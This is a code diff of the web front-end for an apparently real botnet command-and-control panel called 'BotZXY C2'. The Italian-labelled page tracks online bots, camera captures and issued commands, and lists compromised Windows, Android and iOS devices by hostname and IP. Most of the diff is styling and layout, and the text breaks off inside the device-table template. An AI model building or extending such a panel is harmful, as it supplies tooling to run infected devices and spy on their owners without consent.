@@ -3,56 +3,97 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>BotZXY · Dashboard</title>
+    <title>BotZXY · C2 Dashboard</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
+        /* ============================================================
+                   RESET & BASE
+                   ============================================================ */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        body {
-            font-family: 'Inter', sans-serif;
-            background: #0b0b1a;
-            color: #e2e8f0;
-            min-height: 100vh;
-            background-image: 
-                radial-gradient(circle at 10% 20%, rgba(120, 80, 255, 0.06) 0%, transparent 50%),
-                radial-gradient(circle at 90% 80%, rgba(0, 200, 255, 0.06) 0%, transparent 50%);
+        :root {
+            --bg-primary: #080818;
+            --bg-secondary: #0f0f2a;
+            --bg-card: rgba(20, 20, 50, 0.7);
+            --border-color: rgba(255, 255, 255, 0.05);
+            --text-primary: #f1f5f9;
+            --text-secondary: rgba(255, 255, 255, 0.4);
+            --accent-purple: #8b5cf6;
+            --accent-cyan: #22d3ee;
+            --accent-pink: #ec4899;
+            --accent-green: #34d399;
+            --accent-orange: #f59e0b;
+            --shadow-glow: 0 0 40px rgba(139, 92, 246, 0.08);
+            --radius: 20px;
+            --transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
-        /* ---- SIDEBAR ---- */
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            background-image:
+                radial-gradient(circle at 10% 20%, rgba(139, 92, 246, 0.06) 0%, transparent 50%),
+                radial-gradient(circle at 90% 80%, rgba(34, 211, 238, 0.05) 0%, transparent 50%);
+        }
+
+        ::-webkit-scrollbar {
+            width: 4px;
+            height: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: rgba(139, 92, 246, 0.3);
+            border-radius: 10px;
+        }
+
+        /* ============================================================
+                   SIDEBAR
+                   ============================================================ */
         .sidebar {
             position: fixed;
             top: 0;
             left: 0;
             height: 100vh;
-            width: 220px;
-            background: rgba(12, 12, 30, 0.92);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border-right: 1px solid rgba(255, 255, 255, 0.04);
+            width: 240px;
+            background: rgba(12, 12, 35, 0.92);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-right: 1px solid var(--border-color);
             display: flex;
             flex-direction: column;
-            padding: 1.5rem 1rem;
-            z-index: 50;
-            transition: transform 0.3s ease;
+            padding: 1.8rem 1.2rem;
+            z-index: 100;
+            transition: transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
         .sidebar .logo {
-            font-size: 1.6rem;
+            font-size: 1.8rem;
             font-weight: 800;
-            background: linear-gradient(135deg, #a78bfa, #22d3ee);
+            background: linear-gradient(135deg, var(--accent-purple), var(--accent-cyan));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
-            padding: 0 0.5rem 1.5rem 0.5rem;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            padding-bottom: 1.5rem;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
         }
-
+        .sidebar .logo i {
+            -webkit-text-fill-color: initial;
+            color: var(--accent-purple);
+            font-size: 1.6rem;
+        }
         .sidebar .logo span {
             -webkit-text-fill-color: rgba(255, 255, 255, 0.1);
         }
@@ -60,132 +101,190 @@
         .sidebar .nav {
             display: flex;
             flex-direction: column;
-            gap: 0.3rem;
+            gap: 0.2rem;
             flex: 1;
-            padding-top: 1rem;
+            padding-top: 1.2rem;
         }
 
         .sidebar .nav a {
             display: flex;
             align-items: center;
-            gap: 0.8rem;
+            gap: 0.9rem;
             padding: 0.7rem 1rem;
             border-radius: 12px;
-            color: rgba(255, 255, 255, 0.35);
+            color: rgba(255, 255, 255, 0.3);
             text-decoration: none;
             font-size: 0.85rem;
             font-weight: 500;
-            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            transition: var(--transition);
+            position: relative;
         }
-
         .sidebar .nav a i {
             font-size: 1.1rem;
             min-width: 24px;
             text-align: center;
         }
-
         .sidebar .nav a:hover {
             color: #fff;
-            background: rgba(120, 80, 255, 0.08);
+            background: rgba(139, 92, 246, 0.08);
         }
-
         .sidebar .nav a.active {
-            color: #a78bfa;
-            background: rgba(120, 80, 255, 0.1);
-            border-left: 3px solid #a78bfa;
+            color: var(--accent-purple);
+            background: rgba(139, 92, 246, 0.1);
         }
-
+        .sidebar .nav a.active::before {
+            content: '';
+            position: absolute;
+            left: -1.2rem;
+            width: 3px;
+            height: 28px;
+            background: var(--accent-purple);
+            border-radius: 0 6px 6px 0;
+            box-shadow: 0 0 20px rgba(139, 92, 246, 0.3);
+        }
         .sidebar .nav a .badge-nav {
             margin-left: auto;
-            background: rgba(120, 80, 255, 0.15);
-            color: #a78bfa;
+            background: rgba(139, 92, 246, 0.15);
+            color: var(--accent-purple);
             font-size: 0.6rem;
             padding: 0.1rem 0.6rem;
             border-radius: 40px;
+            font-weight: 600;
         }
 
         .sidebar .footer-sidebar {
             font-size: 0.6rem;
-            color: rgba(255, 255, 255, 0.08);
+            color: rgba(255, 255, 255, 0.06);
             text-align: center;
             padding-top: 1rem;
-            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            border-top: 1px solid var(--border-color);
             letter-spacing: 0.05em;
         }
-
-        /* ---- MAIN ---- */
-        .main {
-            margin-left: 220px;
-            padding: 1.8rem 2.2rem;
+        .sidebar .footer-sidebar .status-dot {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--accent-green);
+            box-shadow: 0 0 12px rgba(52, 211, 153, 0.4);
+            animation: pulse 2s ease-in-out infinite;
+            margin-right: 6px;
         }
 
-        /* ---- TOP BAR ---- */
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.3;
+                transform: scale(0.7);
+            }
+        }
+
+        /* ============================================================
+                   MAIN CONTENT
+                   ============================================================ */
+        .main {
+            margin-left: 240px;
+            padding: 1.8rem 2.2rem;
+            min-height: 100vh;
+        }
+
+        /* ============================================================
+                   TOPBAR
+                   ============================================================ */
         .topbar {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 2rem;
+            flex-wrap: wrap;
+            gap: 0.8rem;
         }
 
-        .topbar h1 {
-            font-size: 1.4rem;
-            font-weight: 600;
-        }
-
-        .topbar h1 span {
-            color: rgba(255, 255, 255, 0.2);
-            font-weight: 400;
-        }
-
-        .topbar .right {
+        .topbar-left {
             display: flex;
             align-items: center;
             gap: 1rem;
         }
 
-        .topbar .status-dot {
+        .topbar-left .hamburger {
+            display: none;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid var(--border-color);
+            color: #fff;
+            font-size: 1.2rem;
+            padding: 0.4rem 0.8rem;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        .topbar-left .hamburger:hover {
+            background: rgba(139, 92, 246, 0.1);
+        }
+
+        .topbar-left h1 {
+            font-size: 1.4rem;
+            font-weight: 600;
+        }
+        .topbar-left h1 span {
+            color: var(--text-secondary);
+            font-weight: 400;
+        }
+
+        .topbar-right {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+        }
+
+        .topbar-right .btn-ghost {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            padding: 0.4rem 1rem;
+            border-radius: 40px;
+            font-size: 0.75rem;
+            cursor: pointer;
+            transition: var(--transition);
             display: flex;
             align-items: center;
             gap: 0.4rem;
-            font-size: 0.75rem;
-            color: rgba(255, 255, 255, 0.3);
+        }
+        .topbar-right .btn-ghost:hover {
+            background: rgba(139, 92, 246, 0.08);
+            color: #fff;
+            border-color: rgba(139, 92, 246, 0.2);
+        }
+        .topbar-right .btn-ghost i {
+            font-size: 0.8rem;
         }
 
-        .topbar .status-dot .dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #34d399;
-            box-shadow: 0 0 12px rgba(52, 211, 153, 0.3);
-            animation: dotPulse 1.8s ease-in-out infinite;
-        }
-
-        @keyframes dotPulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.4; transform: scale(0.7); }
-        }
-
-        .btn-refresh-top {
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            color: rgba(255, 255, 255, 0.4);
-            padding: 0.4rem 1rem;
-            border-radius: 40px;
-            cursor: pointer;
-            font-size: 0.75rem;
-            transition: all 0.3s ease;
+        .topbar-right .live-badge {
             display: flex;
             align-items: center;
-            gap: 0.5rem;
+            gap: 0.4rem;
+            font-size: 0.7rem;
+            color: var(--accent-green);
+            background: rgba(52, 211, 153, 0.08);
+            padding: 0.3rem 0.8rem;
+            border-radius: 40px;
+            border: 1px solid rgba(52, 211, 153, 0.1);
+        }
+        .topbar-right .live-badge .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--accent-green);
+            box-shadow: 0 0 12px rgba(52, 211, 153, 0.4);
+            animation: pulse 2s ease-in-out infinite;
         }
 
-        .btn-refresh-top:hover {
-            background: rgba(120, 80, 255, 0.1);
-            color: #fff;
-            border-color: rgba(120, 80, 255, 0.2);
-        }
-
-        /* ---- STATS GRID ---- */
+        /* ============================================================
+                   STATS GRID
+                   ============================================================ */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
@@ -194,26 +293,26 @@
         }
 
         .stat-card {
-            background: rgba(18, 18, 40, 0.5);
+            background: var(--bg-card);
             backdrop-filter: blur(12px);
             -webkit-backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            border-radius: 20px;
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
             padding: 1.2rem 1.5rem;
             display: flex;
             align-items: center;
             gap: 1rem;
-            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            transition: var(--transition);
         }
-
         .stat-card:hover {
-            transform: translateY(-3px);
-            border-color: rgba(120, 80, 255, 0.15);
+            transform: translateY(-4px);
+            border-color: rgba(139, 92, 246, 0.15);
+            box-shadow: var(--shadow-glow);
         }
 
         .stat-card .icon {
-            width: 44px;
-            height: 44px;
+            width: 46px;
+            height: 46px;
             border-radius: 14px;
             display: flex;
             align-items: center;
@@ -221,11 +320,22 @@
             font-size: 1.2rem;
             flex-shrink: 0;
         }
-
-        .stat-card .icon.purple { background: rgba(120, 80, 255, 0.12); color: #a78bfa; }
-        .stat-card .icon.cyan { background: rgba(34, 211, 238, 0.12); color: #22d3ee; }
-        .stat-card .icon.pink { background: rgba(236, 72, 153, 0.12); color: #f472b6; }
-        .stat-card .icon.green { background: rgba(52, 211, 153, 0.12); color: #34d399; }
+        .stat-card .icon.purple {
+            background: rgba(139, 92, 246, 0.12);
+            color: var(--accent-purple);
+        }
+        .stat-card .icon.cyan {
+            background: rgba(34, 211, 238, 0.12);
+            color: var(--accent-cyan);
+        }
+        .stat-card .icon.pink {
+            background: rgba(236, 72, 153, 0.12);
+            color: var(--accent-pink);
+        }
+        .stat-card .icon.green {
+            background: rgba(52, 211, 153, 0.12);
+            color: var(--accent-green);
+        }
 
         .stat-card .info .number {
             font-size: 1.8rem;
@@ -233,17 +343,23 @@
             letter-spacing: -0.02em;
             line-height: 1.2;
         }
-
         .stat-card .info .label {
             font-size: 0.65rem;
             text-transform: uppercase;
             letter-spacing: 0.06em;
-            color: rgba(255, 255, 255, 0.25);
+            color: var(--text-secondary);
             font-weight: 600;
         }
+        .stat-card .info .trend {
+            font-size: 0.6rem;
+            color: var(--accent-green);
+            margin-left: 0.3rem;
+        }
 
-        /* ---- CHART ROW ---- */
-        .chart-row {
+        /* ============================================================
+                   CHARTS ROW
+                   ============================================================ */
+        .charts-row {
             display: grid;
             grid-template-columns: 2fr 1fr;
             gap: 1.2rem;
@@ -251,48 +367,65 @@
         }
 
         .chart-card {
-            background: rgba(18, 18, 40, 0.45);
+            background: var(--bg-card);
             backdrop-filter: blur(12px);
             -webkit-backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            border-radius: 24px;
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
             padding: 1.5rem;
+            transition: var(--transition);
+        }
+        .chart-card:hover {
+            border-color: rgba(139, 92, 246, 0.08);
         }
 
-        .chart-card .header-chart {
+        .chart-card .chart-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 1rem;
+            margin-bottom: 0.8rem;
         }
-
-        .chart-card .header-chart h3 {
-            font-size: 0.85rem;
+        .chart-card .chart-header h3 {
+            font-size: 0.8rem;
             font-weight: 600;
-            color: rgba(255, 255, 255, 0.6);
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
         }
-
-        .chart-card .header-chart h3 i {
-            color: #a78bfa;
-            margin-right: 0.5rem;
+        .chart-card .chart-header h3 i {
+            color: var(--accent-purple);
+            margin-right: 0.4rem;
+        }
+        .chart-card .chart-header .period {
+            font-size: 0.6rem;
+            color: var(--text-secondary);
+            background: rgba(255, 255, 255, 0.03);
+            padding: 0.1rem 0.6rem;
+            border-radius: 40px;
         }
 
         .chart-card canvas {
-            max-height: 200px;
+            max-height: 180px;
             max-width: 100%;
         }
 
-        /* ---- DEVICES TABLE ---- */
-        .card-table {
-            background: rgba(18, 18, 40, 0.45);
+        /* ============================================================
+                   DEVICES TABLE
+                   ============================================================ */
+        .table-card {
+            background: var(--bg-card);
             backdrop-filter: blur(12px);
             -webkit-backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            border-radius: 24px;
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
             padding: 1.5rem 1.5rem 1.8rem;
+            transition: var(--transition);
+        }
+        .table-card:hover {
+            border-color: rgba(139, 92, 246, 0.06);
         }
 
-        .card-table .header-table {
+        .table-card .table-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -300,26 +433,41 @@
             flex-wrap: wrap;
             gap: 0.5rem;
         }
-
-        .card-table .header-table h2 {
+        .table-card .table-header h2 {
             font-size: 1rem;
             font-weight: 600;
             display: flex;
             align-items: center;
             gap: 0.6rem;
         }
-
-        .card-table .header-table h2 i {
-            color: #a78bfa;
+        .table-card .table-header h2 i {
+            color: var(--accent-purple);
         }
-
-        .card-table .header-table .badge {
+        .table-card .table-header .badge-live {
             font-size: 0.6rem;
-            background: rgba(120, 80, 255, 0.12);
+            background: rgba(139, 92, 246, 0.1);
             padding: 0.2rem 0.8rem;
             border-radius: 40px;
-            color: #a78bfa;
-            border: 1px solid rgba(120, 80, 255, 0.06);
+            color: var(--accent-purple);
+            border: 1px solid rgba(139, 92, 246, 0.06);
+        }
+        .table-card .table-header .actions-header {
+            display: flex;
+            gap: 0.4rem;
+        }
+        .table-card .table-header .actions-header button {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            padding: 0.2rem 0.6rem;
+            border-radius: 8px;
+            font-size: 0.7rem;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        .table-card .table-header .actions-header button:hover {
+            background: rgba(139, 92, 246, 0.08);
+            color: #fff;
         }
 
         .table-wrap {
@@ -335,12 +483,12 @@
         thead th {
             text-align: left;
             padding: 0.5rem 0.4rem;
-            color: rgba(255, 255, 255, 0.2);
+            color: var(--text-secondary);
             font-weight: 600;
             font-size: 0.6rem;
             text-transform: uppercase;
             letter-spacing: 0.08em;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            border-bottom: 1px solid var(--border-color);
         }
 
         tbody td {
@@ -348,7 +496,9 @@
             border-bottom: 1px solid rgba(255, 255, 255, 0.02);
             vertical-align: middle;
         }
-
+        tbody tr {
+            transition: var(--transition);
+        }
         tbody tr:hover {
             background: rgba(255, 255, 255, 0.02);
         }
@@ -363,22 +513,21 @@
             align-items: center;
             gap: 0.3rem;
         }
-
         .badge-status.online {
-            background: rgba(52, 211, 153, 0.12);
-            color: #34d399;
+            background: rgba(52, 211, 153, 0.1);
+            color: var(--accent-green);
         }
         .badge-status.online::before {
             content: '';
             width: 5px;
             height: 5px;
             border-radius: 50%;
-            background: #34d399;
+            background: var(--accent-green);
             box-shadow: 0 0 8px rgba(52, 211, 153, 0.4);
-            animation: dotPulse 1.8s ease-in-out infinite;
+            animation: pulse 2s ease-in-out infinite;
         }
         .badge-status.offline {
-            background: rgba(239, 68, 68, 0.08);
+            background: rgba(239, 68, 68, 0.06);
             color: #f87171;
         }
         .badge-status.offline::before {
@@ -392,92 +541,172 @@
         .btn-action {
             background: transparent;
             border: none;
-            color: rgba(255, 255, 255, 0.2);
+            color: var(--text-secondary);
             padding: 0.2rem 0.4rem;
             border-radius: 8px;
             cursor: pointer;
-            transition: all 0.2s ease;
+            transition: var(--transition);
             font-size: 0.8rem;
         }
-
-        .btn-action:hover { color: #fff; background: rgba(255, 255, 255, 0.04); }
-        .btn-action.primary:hover { color: #a78bfa; background: rgba(120, 80, 255, 0.08); }
-        .btn-action.danger:hover { color: #f87171; background: rgba(239, 68, 68, 0.08); }
-        .btn-action.success:hover { color: #34d399; background: rgba(52, 211, 153, 0.08); }
+        .btn-action:hover {
+            color: #fff;
+            background: rgba(255, 255, 255, 0.04);
+        }
+        .btn-action.primary:hover {
+            color: var(--accent-purple);
+            background: rgba(139, 92, 246, 0.08);
+        }
+        .btn-action.danger:hover {
+            color: #f87171;
+            background: rgba(239, 68, 68, 0.08);
+        }
+        .btn-action.success:hover {
+            color: var(--accent-green);
+            background: rgba(52, 211, 153, 0.08);
+        }
+        .btn-action.warning:hover {
+            color: var(--accent-orange);
+            background: rgba(245, 158, 11, 0.08);
+        }
 
         .empty-state {
             text-align: center;
             padding: 2.5rem;
-            color: rgba(255, 255, 255, 0.1);
+            color: var(--text-secondary);
         }
-
         .empty-state i {
             font-size: 2rem;
             margin-bottom: 0.5rem;
             display: block;
+            opacity: 0.3;
         }
 
-        /* ---- RESPONSIVE ---- */
+        /* ============================================================
+                   OVERLAY MOBILE
+                   ============================================================ */
+        .sidebar-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 90;
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+        }
+        .sidebar-overlay.active {
+            display: block;
+        }
+
+        /* ============================================================
+                   RESPONSIVE
+                   ============================================================ */
+        @media (max-width: 1200px) {
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
         @media (max-width: 992px) {
-            .stats-grid { grid-template-columns: repeat(2, 1fr); }
-            .chart-row { grid-template-columns: 1fr; }
+            .charts-row {
+                grid-template-columns: 1fr;
+            }
         }
 
         @media (max-width: 768px) {
             .sidebar {
                 transform: translateX(-100%);
-                width: 240px;
+                width: 260px;
             }
-            .sidebar.open { transform: translateX(0); }
-            .main { margin-left: 0; padding: 1rem; }
-            .stats-grid { grid-template-columns: 1fr 1fr; gap: 0.6rem; }
-            .stat-card { padding: 0.8rem 1rem; }
-            .stat-card .info .number { font-size: 1.4rem; }
-            .topbar { flex-direction: column; align-items: flex-start; gap: 0.5rem; }
-            .hamburger {
-                display: flex !important;
-                background: rgba(255,255,255,0.04);
-                border: none;
-                color: #fff;
-                font-size: 1.2rem;
-                padding: 0.4rem 0.8rem;
-                border-radius: 10px;
-                cursor: pointer;
+            .sidebar.open {
+                transform: translateX(0);
+            }
+
+            .topbar-left .hamburger {
+                display: flex;
+            }
+
+            .main {
+                margin-left: 0;
+                padding: 1rem;
+            }
+
+            .stats-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 0.6rem;
+            }
+            .stat-card {
+                padding: 0.8rem 1rem;
+            }
+            .stat-card .info .number {
+                font-size: 1.4rem;
+            }
+
+            .topbar {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 0.5rem;
+            }
+            .topbar-right {
+                justify-content: space-between;
             }
         }
 
         @media (max-width: 480px) {
-            .stats-grid { grid-template-columns: 1fr 1fr; gap: 0.4rem; }
-            .stat-card .icon { width: 32px; height: 32px; font-size: 0.9rem; }
-            .stat-card .info .number { font-size: 1.2rem; }
-            .stat-card .info .label { font-size: 0.5rem; }
+            .stats-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 0.4rem;
+            }
+            .stat-card .icon {
+                width: 34px;
+                height: 34px;
+                font-size: 0.9rem;
+            }
+            .stat-card .info .number {
+                font-size: 1.2rem;
+            }
+            .stat-card .info .label {
+                font-size: 0.5rem;
+            }
+            .table-card {
+                padding: 0.8rem;
+            }
+            .table-card .table-header h2 {
+                font-size: 0.85rem;
+            }
         }
 
-        .hamburger { display: none; }
-
-        ::-webkit-scrollbar { width: 4px; height: 4px; }
-        ::-webkit-scrollbar-track { background: transparent; }
-        ::-webkit-scrollbar-thumb { background: rgba(120, 80, 255, 0.3); border-radius: 10px; }
-
-        /* Overlay mobile */
-        .sidebar-overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.5);
-            z-index: 40;
+        @media (max-width: 400px) {
+            .stats-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 0.3rem;
+            }
+            .stat-card {
+                padding: 0.5rem 0.6rem;
+                gap: 0.5rem;
+            }
+            .stat-card .icon {
+                width: 28px;
+                height: 28px;
+                font-size: 0.7rem;
+                border-radius: 10px;
+            }
+            .stat-card .info .number {
+                font-size: 1rem;
+            }
         }
-        .sidebar-overlay.active { display: block; }
     </style>
 </head>
 <body>
 
-    <!-- Overlay mobile -->
+    <!-- OVERLAY MOBILE -->
     <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
 
-    <!-- SIDEBAR -->
+    <!-- ===== SIDEBAR ===== -->
     <aside class="sidebar" id="sidebar">
-        <div class="logo">Bot<span>ZXY</span></div>
+        <div class="logo">
+            <i class="fas fa-robot"></i>
+            Bot<span>ZXY</span>
+        </div>
         <nav class="nav">
             <a href="#" class="active"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
             <a href="#"><i class="fas fa-mobile-alt"></i> Devices <span class="badge-nav" id="deviceBadge">0</span></a>
@@ -487,21 +716,24 @@
             <a href="#"><i class="fas fa-cog"></i> Settings</a>
             <a href="/logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
         </nav>
-        <div class="footer-sidebar">NEON v2.0 · <span id="footerTime"></span></div>
+        <div class="footer-sidebar">
+            <span class="status-dot"></span> Sistema attivo · <span id="footerTime"></span>
+        </div>
     </aside>
 
-    <!-- MAIN -->
+    <!-- ===== MAIN ===== -->
     <main class="main">
 
         <!-- TOPBAR -->
         <div class="topbar">
-            <div style="display:flex;align-items:center;gap:0.8rem;">
+            <div class="topbar-left">
                 <button class="hamburger" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>
                 <h1>Dashboard <span>| BotZXY C2</span></h1>
             </div>
-            <div class="right">
-                <span class="status-dot"><span class="dot"></span> Sistema attivo</span>
-                <button class="btn-refresh-top" onclick="refreshAll()"><i class="fas fa-sync"></i> Aggiorna</button>
+            <div class="topbar-right">
+                <span class="live-badge"><span class="dot"></span> LIVE</span>
+                <button class="btn-ghost" onclick="refreshAll()"><i class="fas fa-sync"></i> Aggiorna</button>
+                <button class="btn-ghost" onclick="exportData()"><i class="fas fa-download"></i> Esporta</button>
             </div>
         </div>
 
@@ -511,54 +743,60 @@
                 <div class="icon purple"><i class="fas fa-mobile-alt"></i></div>
                 <div class="info">
                     <div class="number" id="totalDevices">0</div>
-                    <div class="label">Total Devices</div>
+                    <div class="label">Total Devices <span class="trend">▲</span></div>
                 </div>
             </div>
             <div class="stat-card">
                 <div class="icon cyan"><i class="fas fa-wifi"></i></div>
                 <div class="info">
                     <div class="number" id="onlineDevices">0</div>
-                    <div class="label">Online Bots</div>
+                    <div class="label">Online Bots <span class="trend">●</span></div>
                 </div>
             </div>
             <div class="stat-card">
                 <div class="icon pink"><i class="fas fa-camera"></i></div>
                 <div class="info">
                     <div class="number" id="totalCaptures">0</div>
-                    <div class="label">Captures</div>
+                    <div class="label">Captures <span class="trend">▲</span></div>
                 </div>
             </div>
             <div class="stat-card">
                 <div class="icon green"><i class="fas fa-terminal"></i></div>
                 <div class="info">
                     <div class="number" id="totalCommands">0</div>
-                    <div class="label">Commands</div>
+                    <div class="label">Commands <span class="trend">▼</span></div>
                 </div>
             </div>
         </div>
 
         <!-- CHARTS -->
-        <div class="chart-row">
+        <div class="charts-row">
             <div class="chart-card">
-                <div class="header-chart">
-                    <h3><i class="fas fa-chart-line"></i> Attività dispositivi (ultime 24h)</h3>
+                <div class="chart-header">
+                    <h3><i class="fas fa-chart-line"></i> Attività dispositivi (24h)</h3>
+                    <span class="period">Ultime 24 ore</span>
                 </div>
                 <canvas id="activityChart"></canvas>
             </div>
             <div class="chart-card">
-                <div class="header-chart">
+                <div class="chart-header">
                     <h3><i class="fas fa-chart-pie"></i> Piattaforme</h3>
+                    <span class="period">Distribuzione</span>
                 </div>
                 <canvas id="platformChart"></canvas>
             </div>
         </div>
 
         <!-- TABLE -->
-        <div class="card-table">
-            <div class="header-table">
+        <div class="table-card">
+            <div class="table-header">
                 <h2><i class="fas fa-robot"></i> BotZXY Connected Devices</h2>
-                <div>
-                    <span class="badge"><i class="fas fa-bolt"></i> LIVE</span>
+                <div style="display:flex; align-items:center; gap:0.6rem; flex-wrap:wrap;">
+                    <span class="badge-live"><i class="fas fa-bolt"></i> ACTIVE</span>
+                    <div class="actions-header">
+                        <button onclick="refreshDevices()"><i class="fas fa-sync"></i></button>
+                        <button onclick="filterDevices()"><i class="fas fa-filter"></i></button>
+                    </div>
                 </div>
             </div>
             <div class="table-wrap">
@@ -584,247 +822,339 @@
     </main>
 
     <script>
-    // ---- STATO ----
-    let devicesData = [];
-    let activityChart = null;
-    let platformChart = null;
-    let statsData = {};
+        // ============================================================
+        //  STATO
+        // ============================================================
+        let devicesData = [];
+        let activityChart = null;
+        let platformChart = null;
 
-    // ---- TOGGLE SIDEBAR (mobile) ----
-    function toggleSidebar() {
-        document.getElementById('sidebar').classList.toggle('open');
-        document.getElementById('sidebarOverlay').classList.toggle('active');
-    }
-
-    // ---- REFRESH COMPLETO ----
-    function refreshAll() {
-        refreshDevices();
-        refreshStats();
-        refreshCharts();
-    }
-
-    // ---- REFRESH STATS ----
-    function refreshStats() {
-        fetch('/api/stats')
-            .then(res => res.json())
-            .then(data => {
-                statsData = data;
-                document.getElementById('totalDevices').textContent = data.total_devices || 0;
-                document.getElementById('onlineDevices').textContent = data.online_devices || 0;
-                document.getElementById('totalCaptures').textContent = data.total_captures || 0;
-                document.getElementById('totalCommands').textContent = data.total_commands || 0;
-                document.getElementById('deviceBadge').textContent = data.total_devices || 0;
-                document.getElementById('captureBadge').textContent = data.total_captures || 0;
-            })
-            .catch(() => {
-                // Fallback a 0 se API non risponde
-                document.getElementById('totalDevices').textContent = '0';
-                document.getElementById('onlineDevices').textContent = '0';
-                document.getElementById('totalCaptures').textContent = '0';
-                document.getElementById('totalCommands').textContent = '0';
-            });
-    }
-
-    // ---- REFRESH DEVICES ----
-    function refreshDevices() {
-        const tbody = document.getElementById('devicesBody');
-        tbody.innerHTML = `<tr><td colspan="8" style="text-align:center; padding:1.5rem; color:rgba(255,255,255,0.1);">
-            <i class="fas fa-spinner fa-spin" style="font-size:1.2rem;"></i> Caricamento...
-        </tr>`;
-
-        fetch('/api/devices')
-            .then(res => res.json())
-            .then(data => {
-                devicesData = data;
-                renderDevices(data);
-            })
-            .catch(() => {
-                tbody.innerHTML = `<tr><td colspan="8" class="empty-state">
-                    <i class="fas fa-robot"></i> Errore di connessione
-                </td></tr>`;
-            });
-    }
-
-    function renderDevices(devices) {
-        const tbody = document.getElementById('devicesBody');
-        if (!devices || devices.length === 0) {
-            tbody.innerHTML = `<tr><td colspan="8" class="empty-state">
-                <i class="fas fa-robot"></i> Nessun dispositivo connesso
-            </td></tr>`;
-            return;
+        // ============================================================
+        //  TOGGLE SIDEBAR (mobile)
+        // ============================================================
+        function toggleSidebar() {
+            document.getElementById('sidebar').classList.toggle('open');
+            document.getElementById('sidebarOverlay').classList.toggle('active');
         }
 
-        let html = '';
-        devices.forEach(d => {
-            const statusClass = d.is_online ? 'online' : 'offline';
-            const statusText = d.is_online ? 'Online' : 'Offline';
-            const icon = d.platform === 'windows' ? 'fa-windows' :
-                         d.platform === 'android' ? 'fa-android' :
-                         d.platform === 'ios' ? 'fa-apple' : 'fa-microchip';
-            const lastSeen = d.last_seen ? new Date(d.last_seen).toLocaleString() : 'Never';
-
-            html += `
-            <tr>
-                <td><code style="color:#a78bfa; font-size:0.65rem;">${d.device_id.substring(0, 14)}...</code></td>
-                <td><i class="fab ${icon}" style="opacity:0.6; font-size:1rem;"></i> ${d.platform || 'Unknown'}</td>
-                <td><strong style="font-weight:500; font-size:0.85rem;">${d.hostname || 'Unknown'}</strong></td>
-                <td style="color:rgba(255,255,255,0.3); font-size:0.75rem;">${d.ip || 'N/A'}</td>
-                <td><span class="badge-status ${statusClass}">${statusText}</span></td>
